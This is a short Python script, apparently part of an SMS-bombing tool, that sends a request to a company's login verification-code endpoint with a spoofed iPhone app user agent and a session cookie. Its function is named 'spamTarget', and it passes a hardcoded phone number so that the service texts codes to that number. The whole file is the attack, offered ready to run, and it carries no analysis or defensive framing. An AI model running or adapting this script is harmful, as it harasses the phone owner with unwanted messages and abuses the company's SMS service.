import time
import requests


def spamTarget(target):
    urls = 'https://newapp.lgmi.com/login/getVerifyCode.asp'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'ASPSESSIONIDSCRDQCQQ=MKAAOIBBLNGDADMKONDNEFKE',
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'User-Agent': 'ironLGMI/3.7.4 (iPhone; iOS 15.4.1; Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1',
        'Content-Length': '24',
        'Accept-Encoding': 'gzip, deflate'
    }
    payload = 'phone=' + target + '&type=3'
    resp = requests.post(url=urls, headers=headers, data=payload).text
    print(resp)


if __name__ == '__main__':
    targets = '16675526551'
    spamTarget(targets)
